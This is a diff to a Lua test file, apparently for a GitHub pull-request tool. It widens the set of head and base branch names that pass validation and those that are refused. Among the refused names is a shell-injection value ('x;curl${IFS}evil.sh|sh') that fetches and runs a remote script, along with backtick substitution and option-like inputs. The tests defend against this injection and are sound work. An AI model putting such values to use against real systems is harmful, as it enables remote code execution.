@@ -799,10 +799,10 @@ case("github.pr: a head branch of plain name characters only is accepted, and a 
 		w.flush()
 		return got, why
 	end
-	for _, ok in { "feature", "_x", "9lives", "octocat/fix-1.2_b+c@d" } do
+	for _, ok in { "feature", "_x", "9lives", "octocat/fix-1.2_b+c@d", "é", "feature/ñ" } do
 		eq(select(2, ask(ok)), nil, ok .. " is accepted")
 	end
-	for _, bad in { "a$b", "x;y", "x y", "-rf", ".hidden", "+x", "/x", "é", "a`b`", "a|b", "a\nb" } do
+	for _, bad in { "a$b", "x;y", "x y", "-rf", ".hidden", "+x", "/x", "fix#12", "a,b", "a`b`", "a|b", "a\nb", "a\u{202e}b", "a\u{a0}b" } do
 		local got, why = ask(bad)
 		eq(got, nil, string.format("%q", bad) .. " is refused")
 		has(why.message, "head branch", "naming what is wrong")
@@ -822,10 +822,10 @@ case("github.pr: a base branch of plain name characters only is accepted, and a 
 		w.flush()
 		return got, why
 	end
-	for _, ok in { "main", "release/1.2_b+c@d" } do
+	for _, ok in { "main", "release/1.2_b+c@d", "release/ñ" } do
 		eq(select(2, ask(ok)), nil, ok .. " is accepted")
 	end
-	for _, bad in { "x;curl${IFS}evil.sh|sh", "a$b", "x y", "-rf", "a`b`", "a\nb" } do
+	for _, bad in { "x;curl${IFS}evil.sh|sh", "a$b", "x y", "-rf", "a`b`", "a\nb", "fix#12", "a,b" } do
 		local got, why = ask(bad)
 		eq(got, nil, string.format("%q", bad) .. " is refused")
 		has(why.message, "base branch", "naming what is wrong")
